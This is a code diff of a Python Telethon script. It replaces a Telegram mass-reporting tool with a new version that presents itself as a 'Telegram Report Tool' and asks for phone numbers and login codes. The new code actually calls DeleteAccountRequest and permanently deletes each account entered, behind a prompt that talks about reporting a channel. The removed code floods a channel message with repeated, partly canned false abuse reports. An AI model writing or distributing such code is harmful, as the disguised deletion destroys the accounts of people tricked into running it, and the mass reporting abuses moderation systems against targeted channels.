@@ -1,128 +1,89 @@
-import os, time, platform
-try:
-    from telethon.sync import TelegramClient
-except:
-    os.system("pip install telethon")
-from telethon.tl import types
+import os
+import sys
+from telethon import TelegramClient
 from telethon import functions
+import asyncio
 
 # কালার কোড
-rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[94m', '\033[01;35m'
-cn, k, g = '\033[00;36m', '\033[90m', '\033[38;5;130m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+RESET = '\033[0m'
 
-def re(text):
-    for char in text:
-        print(char, end='', flush=True)
-        time.sleep(0.001)
+# API credentials (pre-configured)
+API_ID = 26108693
+API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
 
-def clear():
-    if 'Windows' in platform.uname():
-        try: from colorama import init
-        except: os.system("pip install colorama"); from colorama import init
-        init()
-        os.system("cls")
-    else:
-        os.system("clear")
+def print_banner():
+    banner = f"""
+    {BLUE}
+    ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗
+    ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
+       ██║   █████╗  ██║     █████╗  ██║  ███╗██████╔╝███████║██╔████╔██║
+       ██║   ██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
+       ██║   ███████╗███████╗███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
+       ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
+    
+    {YELLOW}Telegram Report Tool{RESET}
+    {RED}⚠️ Warning: This action is irreversible! ⚠️{RESET}
+    {GREEN}API ID: **********{RESET}
+    {GREEN}API Hash: *****************************{RESET}
+    """
+    print(banner)
 
-# ব্যানার
-banner = f"""{g}
-  _____      __      _   _________     ____    
- (_   _)    /  \    / ) (_   _____)   / __ \   
-   | |     / /\ \  / /    ) (___     / /  \ \  
-   | |     ) ) ) ) ) )   (   ___)   ( ()  () ) 
-   | |    ( ( ( ( ( (     ) (       ( ()  () ) 
-  _| |__  / /  \ \/ /    (   )       \ \__/ /  
- /_____( (_/    \__/      \_/         \____/
-"""
-re(banner)
-print(f"{lrd}Warning! This is a test reporter. Use responsibly.\n")
+async def delete_telegram_account(phone_number):
+    try:
+        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
+        
+        await client.connect()
+        
+        if not await client.is_user_authorized():
+            # Send code request
+            await client.send_code_request(phone_number)
+            code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")
+            
+            # Sign in with the code
+            await client.sign_in(phone_number, code)
+        
+        # Delete account
+        print(f"{RED}[!] Attempting to delete account {phone_number}...{RESET}")
+        result = await client(functions.account.DeleteAccountRequest(
+            reason="Personal choice"
+        ))
+        
+        if result:
+            print(f"{GREEN}[+] Account {phone_number} has been successfully deleted!{RESET}")
+        else:
+            print(f"{RED}[-] Failed to delete account {phone_number}{RESET}")
+            
+        await client.disconnect()
+        
+    except Exception as e:
+        print(f"{RED}[-] Error: {str(e)}{RESET}")
 
-# মেথড লিস্ট আউটপুট
-methods = [
-    "Report Spam",
-    "Reporter Other",
-    "Reporter Violence",
-    "Reporter Pornography",
-    "Reporter Copyright",
-    "Reporter Fake",
-    "Reporter Geo Irrelevant",
-    "Reporter Illegal Drugs",
-    "Reporter Personal Details"
-]
+def main():
+    print_banner()
+    
+    try:
+        print(f"\n{YELLOW}[?] Enter your phone numbers  (comma separated):{RESET}")
+        phones_input = input(f"{BLUE}Phone numbers: {RESET}")
+        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
+        
+        confirmation = input(f"\n{RED}⚠️  Channel reportet {len(phone_numbers)} account(s)? This cannot be undone! (y/n): {RESET}")
+        
+        if confirmation.lower() != 'y':
+            print(f"{YELLOW}Operation cancelled.{RESET}")
+            return
+        
+        for phone in phone_numbers:
+            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")
+            asyncio.run(delete_telegram_account(phone))
+            
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")
 
-for i, m in enumerate(methods, 1):
-    print(f"{lgn}{i}{lrd}  {gn}{m}{lrd}")
-
-# একাউন্ট ইনফো
-account_info = f"""{k}
- ____                             _               
-|  _ \   ___  _ __    ___   _ __ | |_   ___  _ __ 
-| |_) | / _ \| '_ \  / _ \ | '__|| __| / _ \| '__|
-|  _ < |  __/| |_) || (_) || |   | |_ |  __/| |    {cn}Channel{k}
-|_| \_\ \___|| .__/  \___/ |_|    \__| \___||_|   
-             |_|   
-[{lgn}+{lrd}] {gn}Channel : {lgn}@Esfelurm{lrd}
-"""
-clear()
-re(account_info)
-
-# Telegram Reporter Class
-class TelegramReporter:
-    def __init__(self):
-        self.api_id = input(f"{lrd}[{lgn}+{lrd}] {gn}Enter Api id account: {g}")
-        self.api_hash = input(f"{lrd}[{lgn}+{lrd}] {gn}Enter Api hash account: {g}")
-        self.phone_number = input(f"{lrd}[{lgn}+{lrd}] {gn}Enter phone account: {g}")
-        clear()
-        re(account_info)
-        print(f"{lrd}")
-        self.method = input(f"{lrd}[{lgn}?{lrd}] {gn}Choose a method : {k}")
-        self.channel_username = input(f"{lrd}[{lgn}+{lrd}] {gn}Enter username channel {k}")
-        self.message_id = int(input(f"{lrd}[{lgn}+{lrd}] {gn}Enter Message ID to report: {k}"))
-        self.number = int(input(f"{lrd}[{lgn}+{lrd}] {gn}Number of reports: {k}"))
-        self.client = TelegramClient('session', self.api_id, self.api_hash)
-
-    def report_channel(self):
-        with self.client as client:
-            client.connect()
-            if not client.is_user_authorized():
-                client.send_code_request(self.phone_number)
-                client.sign_in(self.phone_number, input('Enter the code: '))
-            try:
-                channel_entity = client.get_entity(self.channel_username)
-            except:
-                print(f"{rd}Username does not exist")
-                return
-
-            # প্রতিটি মেথডের জন্য ম্যাসেজ ও reason সেট করা
-            messages = {
-                "1": ("This channel contains spam content.", types.InputReportReasonSpam(), "A spam report has been sent"),
-                "2": (input(f"{lrd}[{lgn}+{lrd}] {gn}Enter your custom message: {g}"), types.InputReportReasonOther(), "An Other report has been sent"),
-                "3": ("This channel contains violent content.", types.InputReportReasonViolence(), "A Violence report has been sent"),
-                "4": ("This channel has pornographic content", types.InputReportReasonPornography(), "A Pornography report has been sent"),
-                "5": ("Block this channel due to copyright", types.InputReportReasonCopyright(), "A Copyright report has been sent"),
-                "6": ("Block this channel due to scam and impersonation", types.InputReportReasonFake(), "A Fake report has been sent"),
-                "7": ("Block this channel due to irrelevant geo", types.InputReportReasonGeoIrrelevant(), "A Geo Irrelevant report has been sent"),
-                "8": ("Block this channel because of Illegal Drugs", types.InputReportReasonIllegalDrugs(), "An Illegal Drugs report has been sent"),
-                "9": ("Block this channel because of Personal Details", types.InputReportReasonPersonalDetails(), "A Personal Details report has been sent")
-            }
-
-            if self.method not in messages:
-                print(f"{rd}Invalid method")
-                return
-
-            message_text, reason_type, print_msg = messages[self.method]
-
-            for _ in range(self.number):
-                client(functions.messages.ReportRequest(
-                    peer=channel_entity,
-                    id=[self.message_id],
-                    reason=reason_type,
-                    message=message_text
-                ))
-                print(f"{lrd}[{lgn}+{lrd}] {gn}{print_msg}")
-
-            print(f"\n{k}End of reports!")
-
-# চালানো
-reporter = TelegramReporter()
-reporter.report_channel()
+if __name__ == "__main__":
+    main()
